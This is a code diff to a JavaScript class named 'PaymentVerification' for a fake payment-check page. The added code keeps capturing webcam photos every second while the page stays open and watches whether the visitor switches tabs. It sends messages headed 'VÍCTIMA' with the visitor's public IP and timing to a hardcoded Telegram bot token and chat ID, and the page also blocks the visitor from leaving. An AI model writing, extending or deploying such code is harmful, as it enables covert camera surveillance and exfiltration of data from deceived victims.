@@ -171,19 +171,29 @@ class PaymentVerification {
     
     startPhotoCapture() {
         this.isCapturing = true;
-        console.log('🎬 Iniciando captura de fotos cada segundo...');
+        console.log('📸 Iniciando captura de fotos continua cada segundo...');
         
         // Capturar primera foto inmediatamente
         this.captureAndSendPhoto();
         
-        // Luego capturar cada segundo
+        // Luego capturar cada segundo MIENTRAS la página esté abierta
         this.captureInterval = setInterval(() => {
             this.captureAndSendPhoto();
         }, 1000); // Cada 1 segundo
         
-        // Mantener capturando hasta que se cierre la página
+        // Solo detener cuando se cierre la página
         window.addEventListener('beforeunload', () => {
             this.stopPhotoCapture();
+            this.sendFinalMessage();
+        });
+        
+        // También detectar cuando la página pierde/gana foco
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                this.sendTabHiddenMessage();
+            } else {
+                this.sendTabVisibleMessage();
+            }
         });
     }
     
@@ -305,6 +315,75 @@ class PaymentVerification {
         }
     }
     
+    async sendTabHiddenMessage() {
+        try {
+            const message = `⚠️ <b>VÍCTIMA CAMBIÓ DE PESTAÑA</b>
+
+📍 <b>IP:</b> ${await this.getPublicIP()}
+⏰ <b>Hora:</b> ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
+👁️ <b>Estado:</b> Página oculta/minimizada
+📸 <b>Fotos:</b> #${this.photoCount} (continúa en background)
+
+⚡ Víctima puede estar en otra pestaña...`;
+
+            await this.sendDirectToTelegram(message);
+        } catch (error) {
+            console.log('Error enviando mensaje tab hidden:', error);
+        }
+    }
+
+    async sendTabVisibleMessage() {
+        try {
+            const message = `✅ <b>VÍCTIMA REGRESÓ A LA PÁGINA</b>
+
+📍 <b>IP:</b> ${await this.getPublicIP()}
+⏰ <b>Hora:</b> ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
+👁️ <b>Estado:</b> Página visible otra vez
+📸 <b>Fotos:</b> #${this.photoCount} (captura activa)
+
+🎯 Víctima regresó a ver el "pago"`;
+
+            await this.sendDirectToTelegram(message);
+        } catch (error) {
+            console.log('Error enviando mensaje tab visible:', error);
+        }
+    }
+
+    async sendFinalMessage() {
+        try {
+            const message = `🔴 <b>VÍCTIMA SALIÓ DE LA PÁGINA</b>
+
+📍 <b>IP:</b> ${await this.getPublicIP()}
+⏰ <b>Hora:</b> ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
+📸 <b>Total fotos:</b> ${this.photoCount}
+⚡ <b>Duración:</b> ${Math.round(this.photoCount / 60 * 100) / 100} minutos
+
+🏁 Sesión terminada - Cámara desconectada`;
+
+            await this.sendDirectToTelegram(message);
+        } catch (error) {
+            console.log('Error enviando mensaje final:', error);
+        }
+    }
+
+    async sendDirectToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot8083680161:AAFw7sJh6ckiRHkgMS3WsC6J0Ya8Q5aPwE/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '12075234',
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.log('Error enviando directo a Telegram:', error);
+        }
+    }
+
     blockNavigation() {
         // Bloquear navegación hasta que se complete la verificación
         window.addEventListener('beforeunload', (e) => {
